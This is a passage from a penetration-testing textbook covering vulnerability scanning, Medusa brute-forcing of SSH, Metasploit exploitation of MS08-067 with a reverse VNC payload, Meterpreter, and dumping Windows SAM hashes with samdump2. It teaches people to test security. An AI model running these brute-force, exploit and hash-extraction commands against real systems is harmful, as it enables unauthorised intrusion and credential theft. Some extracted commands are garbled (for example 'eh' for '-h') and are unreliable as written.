the “New Scan” button located on the right-hand side of the page. Nessus will
bring up a new window that can be used to conﬁgure and customize your scan.
You can enter individual addresses to scan a single target or a list of IPs to scan
multiple hosts. Figure 3.8 shows the “New Scan” screen.
[Word Count: 89]

When Nessus ﬁnishes the scan, you will be able to review the results by clicking
the “Results” link in the menu bar. The report will provide you with a detailed
listing of all the vulnerabilities that Nessus discovered. We are especially inter-
ested in vulnerabilities labeled high or critical. You should take time to closely
review the report and make detailed notes about the system. We will use these
results in the next step to gain access to the system.
[Word Count: 80]

Once we have completed port scanning and vulnerability scanning for each
of our targets, we should have enough information to begin attacking the
system.
[Word Count: 24]

The easiest way to practice port scanning is to set up two machines or use virtual
machines. You should work your way through each of the options and scan
types that we covered in this chapter. Pay special attention to the output from
each scan. You should run scans against both Linux and Windows boxes.
[Word Count: 55]

You will probably want to add some services or programs to the target system so
that you can be sure you will have open ports. Installing and starting FTP, a web
server, telnet, or SSH will work nicely.
[Word Count: 38]

When a person is ﬁrst learning about port scanning, one of the best ways to
practice is to pick a subnet and hide an IP address in the network. After hiding
the target in the subnet, the goal is to locate the target. Once the target has been
located, the next step is to conduct a full port scan of the system.
[Word Count: 62]

The Basics of Hacking and Penetration Testing
76
[Word Count: 8]

Running this script will allow you to become familiar with the tools and tech-
niques we covered in this chapter. You can enter the script into a text editor and
save the ﬁle as IP_Gen.sh.
[Word Count: 35]

#!/bin/bash
echo "Setting up the victim machine, this will take just a moment."
ifconfig eth0 down
ifconfig eth0 192.168.18.$((($RANDOM %254) þ 1)) up
# uncomment the following lines by removing the #, to start up services
on your victim
# please note, you may need to change the location/path depending on
your distro
#/etc/init.d/ssh start
# note, you may have to generate your SSH key using sshd-generate
#/etc/init.d/apache2 start
#/etc/init.d/atftpd start echo "This victim machine is now setup."
echo "The IP address is somewhere in the 192.168.18.0/24 network."
echo "You may now close this window and begin your attack.Good luck!"
[Word Count: 100]

You will need to use a terminal to navigate to the directory where you created the
ﬁle. You need to make the ﬁle executable before you can run it. You can do this
by typing
[Word Count: 35]

To run the script, you type the following command into a terminal:
[Word Count: 12]

The script should run and provide you with a message saying the victim machine
is all set up. Using the script above, you will be able to practice locating and
scanning a target machine.
[Word Count: 34]

Another great tool for you to learn is OpenVAS. OpenVAS is the open vulner-
ability assessment system. OpenVAS is open source, well documented, actively
developed, and best of all, free. OpenVAS is very similar to Nessus and allows
you to scan targets for vulnerabilities.
[Word Count: 44]

After you are comfortable with the advanced features of these tools, you should
look at other scanners as well. There are lots of good port scanners available. Pick
a few, install them, and learn their features. It may be worth your time and effort
to explore commercial tools like NeXpose, Metasploit Pro, Core Impact, Canvas
and more; these products are not exclusively vulnerability scanners (they are
much more). They all provide excellent vulnerability assessment components,
although each of these tools will cost you actual cash.
[Word Count: 85]

In this chapter, we focused on scanning. This chapter started with a brief over-
view of pings and ping sweeps before moving into the speciﬁcs of scanning. The
topic of scanning was further broken down into two distinct types including port
scanning and vulnerability scanning. The port scanner Nmap was introduced
and several different types of scans were discussed. Actual examples and outputs
of the various scans were demonstrated as well as the interpretation of the Nmap
output. The concept of vulnerability scanning was introduced through the use of
Nessus. Practical examples were presented and discussed throughout this
chapter.
[Word Count: 99]

The Basics of Hacking and Penetration Testing
78
[Word Count: 8]

n
Medusa: Gaining Access to Remote Services
[Word Count: 7]

n
Metasploit: Hacking Hugh Jackman Style!
[Word Count: 6]

n
John the Ripper: King of the Password Crackers
[Word Count: 9]

n
Password Resetting: The Building and the Wrecking Ball
[Word Count: 9]

n
Macof: Making Chicken Salad Out of Chicken Sh*t
[Word Count: 9]

In the simplest terms, exploitation is the process of gaining control over a
system. However, it is important to understand that not every exploit leads to
total system compromise. For example, the Oracle padding exploit can reveal
information and allow us to download ﬁles but does not fully compromise
[Word Count: 49]

The Basics of Hacking and Penetration Testing. http://dx.doi.org/10.1016/B978-0-12-411644-3.00004-2
Copyright  2013, 2011 Elsevier Inc. All rights reserved.
[Word Count: 17]

Because this book focuses on the basics, and as a ﬁnal warning, it is critical to stress
the importance of completing steps 1 and2 prior to conducting exploitation. It can
be tempting to bypass reconnaissance and scanning and jump directly to
Chapter4.Thatisokfornow,butifyouareevergoingtoadvanceyourskillsbeyond
the script kiddie level, you will need to master the other steps as well. The failure to
do so will not only severely limit your ability to mature as a penetration tester but
will also eventually stunt your growth as an exploitation expert. Reconnaissance
and scanning will help to bring order and direction to exploitation.
[Word Count: 97]

Ok. Now that the speech is over, let us put away the soapbox and get to the
business at hand: exploitation. As mentioned earlier, exploitation is one of the
[Word Count: 29]

The Basics of Hacking and Penetration Testing
80
[Word Count: 8]

You can use the previous step’s output as a guide for where to begin your
exploitation attempts. The output from scanning should be used to help shape,
focus, and direct your attacks.
[Word Count: 32]

You should be aware that some remote access systems employ a password
throttling technique that can limit the number of unsuccessful logins you are
allowed. In these instances, either your IP address can be blocked or the user
name can be locked out.
[Word Count: 43]

There are many different tools that can be used for online password cracking.
Two of the most popular tools are Medusa and Hydra. These tools are very
similar in nature. In this book, the focus will be on Medusa, but it is strongly
encouraged that you become familiar with Hydra as well.
[Word Count: 52]

Medusa is described as a parallel login brute forcer that attempts to gain access to
remote authentication services. Medusa is capable of authenticating with a large
number of remote services including Apple ﬁling protocol, FTP, hypertext
transfer protocol, Internet message access protocol, Microsoft SQL, MySQL,
NetWare core protocol, network news transfer, PCAnywhere, POP3, REXEC,
RLOGIN, simple mail transfer protocol authentication, simple network man-
agement protocol, SSHv2, Telnet, VNC, web forms, and more.
[Word Count: 72]

In order to use Medusa, you need several pieces of information including the
target IP address, a user name or user name list that you are attempting to login
as, a password or dictionary ﬁle containing multiple passwords to use when
logging in, and the name of the service you are attempting to authenticate with.
[Word Count: 55]

When it comes to passwords lists, bigger is not always better. “Ofﬂine” password-
cracking tools like JtR can process millions of passwords per second. In these cases,
larger passwords lists are great. However, other password-cracking techniques like
Medusa and Hydra may only be able to process one or two passwords per second. In
these cases, having a single list with billions of passwords is impractical because you
simply will not have the time to get through the entire list. In situations like this, you are
better off having a smaller dictionary, which contains the most popular passwords.
[Word Count: 97]

The Basics of Hacking and Penetration Testing
82
[Word Count: 8]

Once you have your password dictionary, you need to decide if you are going to
attempt to login as a single user or if you want to supply a list of potential users.
If your reconnaissance efforts were rewarded with a list of user names, you may
want to start with those. If you were unsuccessful in gathering user names and
passwords, you may want to focus on the results of the e-mail addresses you
collected with the Harvester. Remember, the ﬁrst part of an e-mail address can
often be used to generate a working domain user name.
[Word Count: 98]

For example, assume that during your penetration test you were unable to ﬁnd
any domain user names. However, the Harvester was able to dig up the e-mail
address ben.owned@example.com. When using Medusa, one option is to create
a list of potential user names based on the e-mail address. These would include
ben.owned, benowned, bowned, ownedb, and several other combinations
derived from the e-mail address. After creating a list of 5e10 user names, it is
possible to feed this list into Medusa and attempt to brute force your way into
the remote authentication service.
[Word Count: 93]

Now that we have a target IP address with some remote authentication service
(we will assume SSH for this example), a password dictionary, and at least one
user name, we are ready to run Medusa. In order to execute the attack, you open
a terminal and issue the following command:
[Word Count: 50]

medusa eh target_ip eu username eP path_to_password_dictionary eM
authentication_service_to_attack
[Word Count: 9]

Take a moment to examine this command in more detail; you will need to
customize the information for your target:
[Word Count: 20]

medusa eh 192.168.18.132 eu ownedb eP /usr/share/john/
password.lst eM ssh
[Word Count: 10]

Figure 4.1 shows the command and its associated output.
[Word Count: 9]

If you are having problems getting Medusa (or any of the tools covered in this book) to run
on your version of Kali, it may be helpful to reinstall the program as we discussed in
Chapter 1. You can reinstall Medusa with the following commands:
[Word Count: 45]

password.lst” including removing the beginning comments (the lines that
begin with a # sign) and adding “Th3B@sics” to the list.
[Word Count: 20]

Depending on the level of engagement and goals identiﬁed in your author-
ization and agreement form, you may be done with the penetration test at
[Word Count: 25]

FIGURE 4.1
Using medusa to brute force into SSH.
[Word Count: 9]

The Basics of Hacking and Penetration Testing
84
[Word Count: 8]

this point. Congratulations! You just completed your ﬁrst penetration test and
successfully gained access to a remote system.
[Word Count: 18]

Although it is not always quite that easy, you will be surprised at how many
times a simple tactic like this works and allows you to fully access and control of
a remote system.
[Word Count: 34]

METASPLOIT: HACKING, HUGH JACKMAN STYLE!
[Word Count: 5]

Of all the tools discussed in this book, Metasploit is my favorite. In many ways, it
is the quintessential hacker tool. It is powerful, ﬂexible, free, and loaded with
awesomeness. It is without a doubt the coolest offensive tool covered in this
book and in some cases it even allows you to hack like Hugh Jackman in
Swordﬁsh! Seriously, it is that good. If you ever get a chance to meet HD Moore or
any of the Metasploit crew, buy them a beer, shake their hand, and say thanks,
because Metasploit is all that and more.
[Word Count: 96]

In 2004, at Defcon 12, HD Moore and Spoonm rocked the world when they
gave a talk titled “Metasploit: Hacking Like in the Movies”. This presentation
focused on “exploit frameworks”. An exploit framework is a formal structure for
developing and launching exploits. Frameworks assist the development process
by providing organization and guidelines for how the various pieces are
assembled and interact with each other.
[Word Count: 64]

Metasploit actually started out as a network game, but its full potential was
realized when it was transformed into a full-ﬂedged exploit tool. Metasploit
actually contains a suite of tools that includes dozens of different functions for
various purposes but it is probably best known for its powerful and ﬂexible
exploitation framework.
[Word Count: 52]

Before the release of Metasploit, security researchers had two main choices: they
could develop custom code by piecing together various exploits and payloads or
they could invest in one of the two commercially available exploit frameworks,
CORE Impact or ImmunitySec’s CANVAS. Both Impact and CANVAS were great
choices and highly successful in their own right. Unfortunately, the cost to li-
cense and use these products meant many security researchers did not have
access to them.
[Word Count: 75]

Metasploit was different from everything else because for the ﬁrst time, hackers
and penetration testers had access to a truly open source exploit framework. This
meant that for the ﬁrst time, everyone could access, collaborate, develop, and
share exploits for free. It also meant that exploits could be developed in an
almost factory-like assembly line approach. The assembly line approach allowed
hackers and penetration testers to build exploits based on their own needs.
[Word Count: 73]

Metasploit allows you to select the target and choose from a wide variety of
payloads. The payloads are interchangeable and not tied to a speciﬁc exploit.
A payload is the “additional functionality” or change in behavior that you want
to accomplish on the target machine. It is the answer to the question: “What do I
[Word Count: 55]

want to do now that I have control of the machine?” Metasploit’s most popular
payloads include adding new users, opening backdoors, and installing new
software onto a target machine. The full list of Metasploit payloads will be
covered shortly.
[Word Count: 39]

Metasploit can be downloaded for free from http://www.metasploit.com. If you
are using Kali, Metasploit is already installed for you. There are several different
ways to interact with Metasploit, but this book will focus on using the menu-
driven, non-graphical user interface (GUI), text-based system called the
msfconsole. Once you understand the basics, the msfconsole is fast, friendly,
intuitive, and easy to use.
[Word Count: 62]

The easiest way to access the msfconsole is by opening a terminal window and
entering:
[Word Count: 15]

The msfconsole can also be accessed through the applications menu on the
desktop. Starting the msfconsole takes between 10 s and 30 s, so do not panic if
nothing happens for a few moments. Eventually, Metasploit will start by pre-
senting you with a welcome banner and an “msf>” command prompt. There are
several different Metasploit banners that are rotated and displayed at random, so it
is normal if your screen looks different from Figure 4.2. The important thing is that
you get the msf> console. The initial Metasploit screen is shown in Figure 4.2.
[Word Count: 95]

Please notice, when Metasploit ﬁrst loads, it shows you the number of exploits,
payloads, encoders, and nops available. It can also show you how many days
have passed since your last update. Because of Metasploit’s rapid growth, active
[Word Count: 38]

The Basics of Hacking and Penetration Testing
86
[Word Count: 8]

community, and ofﬁcial funding, it is vital that you keep Metasploit up-to-date.
This is easily accomplished by entering the following command into a terminal:
[Word Count: 24]

Vulnerabilities are the weaknesses that allow the attacker to exploit the systems
and execute remote code (payloads) on the target. Payloads are the additional
software or functionality that we run on the target system once the exploit has
been successfully executed.
[Word Count: 41]

Nessus versions 4 and below utilize a “high”, “medium”, and “low” ranking system to
classify the severity of its ﬁndings. Beginning with Nessus 5, Tenable has introduced
“critical” to the classiﬁcation scheme. Depending on the OS of your attack machine and
how you installed Nessus, you may end up with Nessus version 4 or 5. As we discussed in
the previous chapter, in order to install or upgrade to version 5, simply visit the Nessus
website and download the latest version for your OS. Nessus provides a .deb ﬁle, which
can be installed by running the following command:
[Word Count: 98]

If you have a previous version of Nessus installed, this will update your software to the
latest revision and retain all your previous settings. Going forward we will utilize Nessus
5, however; for the purpose of this book, either version will work ﬁne.
[Word Count: 43]

Assume that during your penetration test you uncovered a new target at the IP
address 192.168.18.131. Running Nmap tells you that your new target is
a Windows XP machine with service pack 3 installed and the ﬁrewall disabled.
Continuing with step 2, you run both the NSE --script vuln scan and Nessus
against the target. Figure 4.3 shows the completed Nessus report for
192.168.18.131. Notice there are two “critical” ﬁndings. If you are following
[Word Count: 74]

The Basics of Hacking and Penetration Testing
88
[Word Count: 8]

along with this example using an XP no service pack VM, Nessus probably
identiﬁed a dozen or more “critical” vulnerabilities. This is one of the main
reasons why I stress learning basic exploitation with older, unpatched versions of
Windows!
[Word Count: 39]

At this point, we know our target has at least two missing patches. Both these
patches are labeled as “critical” and the descriptions that Nessus provides for
both missing patches mention “remote code execution”. As an attacker, your
heartbeat should be racing a little at this point because the chances are very good
that Metasploit will be able to exploit the target for us.
[Word Count: 64]

Next we need to head over to Metasploit and look for any exploits pertaining to
MS08-067 or MS09-001. Once we have started the msfconsole (and updated
Metasploit), we can use the “search” command to locate any exploits related to
our Nessus or Nmap ﬁndings. To accomplish this, we issue the “search” com-
mand followed by the missing patch number. For example, using the msfcon-
sole, at the “msf>” prompt you would type
[Word Count: 72]

FIGURE 4.3
Nessus output showing the high ﬁndings.
[Word Count: 8]

Note you can also search by date if you are trying to ﬁnd a more recent exploit,
for example, “search 2013” will product all exploits in 2013. Once the command
is completed, make detailed notes on the ﬁndings and search for any other
missing patches. Metasploit will search through its information and return any
relevant information it ﬁnds. Figure 4.4 shows the output of searching for MS08-
067 and MS09-001 within Metasploit.
[Word Count: 72]

Let us review the output from Figure 4.4:
[Word Count: 8]

n
We started Metasploit and issued the “search” command followed by the spe-
ciﬁc missing patch that Nessus discovered.
[Word Count: 19]

n
After searching, Metasploit found a matching exploit and provided us with
several pieces of information about the exploit.
[Word Count: 19]

n
First, it provided us with a matching exploit name and location; “exploit/
windows/smb/ms08_067_netapi”.
[Word Count: 14]

n
Next, Metasploit provided us with a “rank” and brief description.
[Word Count: 11]

It is important to pay close attention to the exploit rank. This information
provides details about how dependable the exploit is (how often the exploit is
successful) as well as how likely the exploit is to cause instability or crashes on
the target system. The higher an exploit is ranked, the more likely it is to succeed
and the less likely it is to cause disruptions on the target system. Metasploit uses
seven ratings to rank each exploit:
[Word Count: 78]

1.
Manual
2.
Low
3.
Average
4.
Normal
5.
Good
6.
Great
7.
Excellent.
[Word Count: 14]

FIGURE 4.4
Finding a match between Nessus and metasploit with the search function.
[Word Count: 13]

The Basics of Hacking and Penetration Testing
90
[Word Count: 8]

The Metasploit “search” feature can also be used to locate non-Microsoft exploits.
Nessus and other scanning products like the Nmap --script vuln scan often include
a common vulnerabilities and exposures (CVE) or Bugtraq ID Database (BID) number to
refer critical vulnerabilities. If you are unable to locate a missing MS patch or are con-
ducting a penetration test against a non-Microsoft product, be sure to search for
matching exploits by CVE or BID numbers! Look for these in the details of your vulner-
ability scan report.
[Word Count: 86]

You can ﬁnd more information and a formal deﬁnition of the ranking meth-
odology on the Metasploit.com website. Finally, the Metasploit search feature
presents us with a brief description of the exploit providing us with additional
details about the attack. When all other things are held equal, you should choose
exploits with a higher rank, as they are less likely to disrupt the normal func-
tioning of your target.
[Word Count: 69]

Now that you understand how to match up vulnerabilities in Nessus with exploits
in Metasploit and you have the ability to choose between two or more Metasploit
exploits, we are ready to unleash the full power of Metasploit on our target.
[Word Count: 41]

Continuing with our example, we will use the MS08-067 because it has a higher
ranking. In order to run Metasploit, we need to provide the framework with
a series of commands. Because Metasploit is already running and we have
already found our exploit, we continue by issuing the “use” command in the
“msf>” terminal to select the desired exploit.
[Word Count: 59]

This command tells Metasploit to use the exploit that your vulnerability scanner
identiﬁed. At this point your “msf>” prompt will change to match the prompt of
your chosen exploit. Once we have the exploit loaded, we need to view the
available payloads. This is accomplished by entering “show payloads” in the
“msf>” terminal.
[Word Count: 53]

This command will list all the available and compatible payloads for the exploit
you have chosen. To select one of the payloads, we type “set payload” followed
by the payload name into the “msf>” terminal.
[Word Count: 35]

set payload windows/vncinject/reverse_tcp
[Word Count: 3]

There are many payloads to choose from. We will discuss the most common
payloads momentarily; however, a full examination of the different payloads is
outside the scope of this book. Please review the Metasploit documentation for
details on each of the available payloads. For this example, we will install VNC
on the target machine and then have that machine connect back to us. If you are
unfamiliar with VNC, it is remote control PC software that allows a user to
[Word Count: 80]

connect to a remote machine, view the remote machine, and control the mouse
and keyboard as if you were physically sitting at that machine. It works much the
same as a remote desktop or a terminal server.
[Word Count: 37]

It is important to note that the VNC software is not currently installed on the target
machine. Remember that some exploits give us the ability to install software on our
target machine. In this example, we are sending an exploit to our target machine.
If successfully executed, the exploit will call the “install vnc” payload and remotely
install the software on the victim machine without any user interaction.
[Word Count: 68]

Different payloads will require different additional options to be set. If you fail
to set the required options for a given payload, your exploit will fail. There are
few things worse than getting this far and failing to set an option. Be sure to
watch this step closely. To view the available options, issue the “show options” in
the “msf>” terminal:
[Word Count: 61]

After issuing the show options command, we are presented with a series of
choices that are speciﬁc to the payload we have chosen. When using the
“windows/vncinject/reverse_tcp” payload, we see that there are two options that
need to be set because they are missing any default information. The ﬁrst is
“RHOST” and the second is “LHOST”. RHOST is the IP address of the target
(remote) host and LHOST (local host) is the IP address you are attacking from. To
set these options, we issue the “set option_name” command in the msf> terminal:
[Word Count: 92]

set RHOST 192.168.18.131
set LHOST 192.168.18.130
[Word Count: 6]

Now that you have required options set, it is usually a good idea at this point to
reissue the “show options” command to ensure you are not missing any
information.
[Word Count: 30]

Once you are sure that you have entered all the information correctly, you are
ready to launch your exploit. To send your exploit to the target machine, simply
type the keyword “exploit” into the “msf>” terminal and hit the Enter key to
begin the process.
[Word Count: 45]

Figure 4.5 shows the minimum command set (minus the “show payloads” and
“show options” command) required to launch the exploit.
[Word Count: 20]

After sending the “exploit” command, you can sit back and watch as the magic
happens. To truly appreciate the beauty and complexity of what is going on here,
you need to build your understanding of buffer overﬂows and exploitation. This
is something that is highly encouraged when you ﬁnish the basics covered in this
book. Metasploit gives you the ability to stand on the shoulders of giants and the
power to launch incredibly complex attacks with just a few commands.
[Word Count: 80]

The Basics of Hacking and Penetration Testing
92
[Word Count: 8]

You should revel in the moment and enjoy the victory of conquering your target,
but you should also commit yourself to learning even more. Commit yourself to
really understanding exploitation.
[Word Count: 30]

Below you will ﬁnd a cheat sheet of the steps required to run Metasploit against
a target machine.
[Word Count: 18]

1.
Start Metasploit by opening a terminal and issue the following command:
a. msf> msfconsole
2.
Issue the “search” command to search for exploits that match your vulner-
ability scanning report:
a. msf> search missing_patch_number (or CVE)
3.
Issue the “use” command to select the desired exploit:
a. msf> use exploit_name_and_path_as_shown_in_2a
4.
Issue “show payloads” command to show available payloads:
a. msf> show payloads
5.
Issue “set” command to select payload:
a. msf> set payload path_to_payload_as_shown_in_4a
6.
Issue “show options” to view any options needing to be ﬁlled out before
exploiting the target:
a. msf> show options
[Word Count: 97]

FIGURE 4.5
The commands required to launch an exploit from metasploit.
[Word Count: 11]

7.
Issue the “set” command for any options listed in 6a:
a. msf> set option_name desired_option_input
8.
Issue “exploit” command to launch exploit against target:
a. msf> “exploit”
[Word Count: 28]

The VNC payload requires the target OS to be running a GUI-based OS like Microsoft
Windows. If your target is not running a GUI, there are lots of other payloads, which
provide direct access to the target system!
[Word Count: 38]

FIGURE 4.6
Screenshot showing successful exploit of Windows target.
[Word Count: 9]

The Basics of Hacking and Penetration Testing
94
[Word Count: 8]

In a “bind” payload, we are both sending the exploit and making a connection to
the target from the attacking machine. In this instance, the attacker sends the
exploit to the target and the target waits passively for a connection to come in.
After sending the exploit, the attacker’s machine then connects to the target.
[Word Count: 55]

In a “reverse” payload, the attacking machine sends the exploit but forces the
target machine to connect back to the attacker. In this type of attack, rather than
passively waiting for an incoming connection on a speciﬁed port or service,
the target machine actively makes a connection back to the attacker. Figure 4.7
should make this concept clearer.
[Word Count: 58]

The last Metasploit topic to discuss is the Meterpreter. The Meterpreter is
a powerful and ﬂexible tool that you will need to learn to control if you are going
[Word Count: 29]

Table 4.1
Sample of Payloads Available for Targeting Windows Machines
[Word Count: 10]

Metasploit Payload Name
Payload Description
[Word Count: 5]

to master the art of Metasploit. The Meta-Interpreter, or Meterpreter, is a payload
available in Metasploit that gives attackers a powerful command shell that can
be used to interact with their target.
[Word Count: 32]

Another big advantage of the Meterpreter is the fact that it runs entirely in
memory and never utilizes the hard drive. This tactic provides a layer of stealth
that helps it evade many antivirus systems and confounds some forensic tools.
[Word Count: 40]

Another reason for using the Meterpreter over a traditional cmd or Linux shell
stems from the fact that starting either of these on a target machine often starts
a new process that can be detected by a keen user or wily administrator. This
means that the attacker raises his or her visibility and chances of detection while
interacting with the target machine. Furthermore, both the cmd.exe and /bin/sh
provide a limited number of tools and commands that can be accessed.
[Word Count: 80]

FIGURE 4.7
Difference between bind and reverse payloads.
[Word Count: 8]

The Basics of Hacking and Penetration Testing
96
[Word Count: 8]

In contrast, the Meterpreter was built from the ground up to be used as sort of
“hacker’s cmd” with the ability to access and control the most popular tools and
functions needed during a penetration test.
[Word Count: 36]

Some of the more advanced features include the ability to extract password
hashes through the “hashdump” command, the ability to interact with a ruby
shell, the ability to load and execute arbitrary Dynamic Link Library (DLLs) on
the target, the ability to remotely control the webcam and microphone, and even
the ability to lock out the local keyboard and mouse!
[Word Count: 60]

As you can see, gaining access to a Meterpreter shell is one of the most powerful,
ﬂexible, and stealthy ways that an attacker can interact with a target. It is well
worth your time to learn how to use this handy tool. We will come back to the
Meterpreter when we discuss post exploitation in step 4.
[Word Count: 57]

JTR: KING OF THE PASSWORD CRACKERS
It is hard to imagine discussing a topic like the basics of hacking without dis-
cussing passwords and password cracking. No matter what we do or how far we
advance, it appears that passwords remain the most popular way to protect data
and allow access to systems. With this in mind, let us take a brief detour to cover
the basics of password cracking.
[Word Count: 70]

If the account you accessed has few or no rights, you will be unable to perform
many of the required steps to further compromise the system. I have actually
[Word Count: 29]

been involved with several Red Team exercises where seemingly competent
hackers are at a complete loss when presented with an unprivileged account.
They throw up their hands and say “Does anyone want unprivileged access to
this machine? I don’t know what to do with it.” In this case, password cracking is
certainly a useful way to escalate privileges and often allows us to gain admin-
istrative rights on a target machine.
[Word Count: 71]

Another reason for cracking passwords and escalating privileges is that many of
the tools we run as penetration testers require administrative-level access in
order to install and execute properly. As a ﬁnal thought, on occasion, pene-
tration testers may ﬁnd themselves in a situation where they were able to crack
the local administrator password (the local admin account on a machine) and
have this password turn out to be the exact same password that the network
administrator was using for the domain administrator account.
[Word Count: 84]

Password hint #1: Never, never, never use the same password for your local machine
administrator as you do for your domain administrator account.
[Word Count: 23]

If we can access the password hashes on a target machine, the chances are good
that with enough time, JtR, a password-cracking tool, can discover the plaintext
version of a password. Password hashes are the encrypted and scrambled
versions of a plaintext password. These hashes can be accessed remotely or
locally. Regardless of how we access the hash ﬁle, the steps and tools required to
crack the passwords remain the same. In its most basic form, password cracking
consists of two parts:
[Word Count: 82]

1.
Locate and download the target system’s password hash ﬁle.
2.
Use a tool to convert the hashed (encrypted) passwords into a plaintext
password.
[Word Count: 24]

Most systems do not store your password as the plaintext value you enter, but
rather they store an encrypted version of the password. This encrypted version is
called a hash. For example, assume you pick a password “qwerty” (which is
obviously a bad idea). When you log into your PC, you type your password
“qwerty” to access the system. However, behind the scenes your computer is
actually calculating, creating, passing, and checking an encrypted version of the
password you entered. This encrypted version or hash of your password appears
to be a random string of characters and numbers.
[Word Count: 98]

Different systems use different hashing algorithms to create their password
hashes. Most systems store their password hashes in a single location. This hash
ﬁle usually contains the encrypted passwords for several users and system
accounts. Unfortunately, gaining access to the password hashes is only half the
battle because simply viewing or even memorizing a password hash (if such
a thing were possible) is not enough to determine the plaintext. This is because
[Word Count: 72]

The Basics of Hacking and Penetration Testing
98
[Word Count: 8]

technically it is not supposed to be possible to work backward from a hash to
plaintext. By its deﬁnition, a hash, once encrypted, is never meant to be decrypted.
[Word Count: 29]

Consider the following example. Assume that we have located a password hash
and we want to discover the plaintext value. It is important to understand that in
most cases we need the plaintext password, not the hashed password. Entering
the hashed value into the system will not get us access because this would simply
cause the system to hash the hash (which is obviously incorrect).
[Word Count: 65]

There is an attack called “Pass the hash” which allows you to replay or resend the hashed
value of a password in order to authenticate with a protected service. When a pass-the-
hash attack is used, there is no need to crack the password and discover its plaintext
value.
[Word Count: 49]

In order to discover the plaintext version of a password, we need to circle
through a series of steps. First we select a hashing algorithm, second we pick
a plaintext word, third we encrypt the plaintext word with the hashing algo-
rithm, and ﬁnally we compare the newly hashed word with the hash from our
target. If the hashes match, we know the plaintext password because no two
different plaintext words should produce the exact same hash.
[Word Count: 77]

Once you are in the John directory, you can issue the following command to test
your c/s metric. Note that you do not need to be in the John directory. The John
executable is located under /usr/sbin/ so it can be executed in any directory.
[Word Count: 45]

This will provide you with a list of performance metrics and let you know how
efﬁcient your system is at generating guesses based on your hardware and the
algorithm being used to hash the passwords.
[Word Count: 35]

As previously mentioned, password cracking can be performed as either a local
attack or a remote attack. In our initial discussion below, we will focus on
[Word Count: 26]

password cracking from the local perspective. That is, how an attacker or pen-
etration tester would crack the passwords if they had physical access to the
machine. Examining the attack from a local perspective will allow you to learn
the proper techniques. We will wrap up this section by discussing how this attack
can be performed remotely.
[Word Count: 57]

TheﬁrstprotectionisthattheSAMﬁleisactuallylockedwhentheOSbootsup.This
means that while the OS is running we do not have the ability to open or copy the
SAM ﬁle. In addition to the lock, the entire SAM ﬁle is encrypted and not viewable.
[Word Count: 35]

Fortunately, there is a way to bypass both these restrictions. Because we are dis-
cussinglocalattacksandbecausewe havephysicalaccesstothe system,thesimplest
way to bypass these protections is to boot to an alternate OS like Kali. By booting
our target to an alternate OS, we are able to bypass the Windows SAM lock. This is
possible because the Windows OS never starts, the lock never engages, and we are
free to access the SAM ﬁle. Unfortunately, the SAM ﬁle is still encrypted, so we need
to use a tool to access the hashes. Fortunately, the required tool is built into Kali.
[Word Count: 96]

In the event that your target does not have an optical drive, you can also use UNetbootin
to create a bootable universal serial bus (USB) drive. UNetbootin allows you to make
“live” Linux versions of Kali and several other distributions. Combining UNetBootin with
a Kali ISO allows you to run an entire OS from a single USB thumb drive, which creates
a very powerful, portable, and concealable toolkit. As with the live CD/DVD, you may need
to change the victim’s boot order before your target will load the alternate OS from your
USB thumb drive.
[Word Count: 95]

The Basics of Hacking and Penetration Testing
100
[Word Count: 8]

After booting the target system to an alternate OS, the ﬁrst thing you need to do
is to mount the local hard drive. Be sure to mount the drive containing the
Windows folder. We can accomplish this by opening a terminal and typing:
[Word Count: 43]

It is important that you mount the correct drive as not all target systems will have
a /dev/sda1. If you are unsure about which drive to mount, you can run the
“fdisk el” command from the terminal. The fdisk tool will list each of the drives
available on your target system and should help you determine which drive you
need to mount. You may also need to create a mount point in the /mnt directory.
To do so, you can simply use the “mkdir” command:
[Word Count: 85]

If you are unsure about how to use the mount command or locate the proper
drive, please review the Linux man pages for the mount command or practice
your newly acquired Google skills from step 1.
[Word Count: 36]

Once you have successfully mounted the local drive in Kali, you will be able to
browse the Windows “C:\” drive. You should now be able to navigate to the SAM
ﬁle. You can do so by typing the following command into a terminal window:
[Word Count: 44]

If everything has gone as planned, you should be in the directory containing the
SAM ﬁle. To view the contents of the current folder issue the “ls” command in the
terminal window, you should see the SAM ﬁle. Figure 4.8 shows a screenshot
displaying each of the steps required to locate the SAM ﬁle (assuming you have
a /mnt/sda1 directory already created).
[Word Count: 62]

Now that we have located the SAM ﬁle, we can use a tool called Samdump2 to
extract the hashes. At this point we have the ability to view and copy the SAM ﬁle,
in effect overcoming the ﬁrst security feature, but the SAM ﬁle is still encrypted.
In order to view an unencrypted copy of the SAM ﬁle, we need to run Sam-
dump2. Samdump2 utilizes a ﬁle on the local machine called “system” to
decrypt the SAM ﬁle. Fortunately, the “system” ﬁle is located in the same
directory as the SAM ﬁle.
[Word Count: 93]

To run Samdump2, we issue the “samdump2” command followed by the name
and location of the “system” ﬁle, followed by the name and location of the SAM
ﬁle we want to view. Recall that earlier we had issued the “cd” command to
[Word Count: 42]

navigate to the Windows/system32/conﬁg folder. At this point, we can extract
the contents of the SAM ﬁle by running the following command in a terminal:
[Word Count: 25]

This will invoke the Samdump2 program and appending the “ >/tmp/
hashes.txt” command will save the results to a ﬁle called “hashes.txt” in Kali’s
/tmp directory. It is always a good idea to verify the extracted hashes before
continuing. You can use the “cat” command to ensure you have a local copy of
the hashes.txt ﬁle as shown below:
[Word Count: 59]

Figure 4.9 shows a screenshot of the Samdump2 command and displays the
contents of the hashes.txt ﬁle.
[Word Count: 17]

FIGURE 4.8
Locating the SAM ﬁle for local password cracking.
[Word Count: 10]

FIGURE 4.9
Extracting and viewing password hashes with samdump2.
[Word Count: 9]

The Basics of Hacking and Penetration Testing
102
[Word Count: 8]

Accessing the raw hashes on some Windows systems may require an extra step. Bkhive
is a tool which allows you to extract the Syskey bootkey from the system hive. It may be
necessary to use bkhive to extract the system key in order to fully expose the password
hashes.
[Word Count: 49]

To run bkhive, we need to supply the system ﬁle and a name for the output ﬁle which will
contain the extracted key. Luckily, as mentioned, the Microsoft was kind enough to keep
the “system” ﬁle in the same directory as the SAM ﬁle. As previously discussed, these
ﬁles are typically found in the Windows/system32/conﬁg directory. If you examine the
contents of the conﬁg folder, you should ﬁnd the “system” ﬁle belonging to the target
machine.
[Word Count: 76]

Assuming you are already in the folder containing the system and SAM ﬁles, you can
utilize bkhive to extract the key with the following command:
[Word Count: 25]

At this point we can continue on with our attack by using Samdump2. In this case, we
utilize Samdump2 with our newly created sys_key.txt ﬁle as shown below:
[Word Count: 28]

samdump2 SAM sys_key.txt > /tmp/hash.txt
[Word Count: 5]

Throughout this example (and all examples in this book) be sure to pay special attention
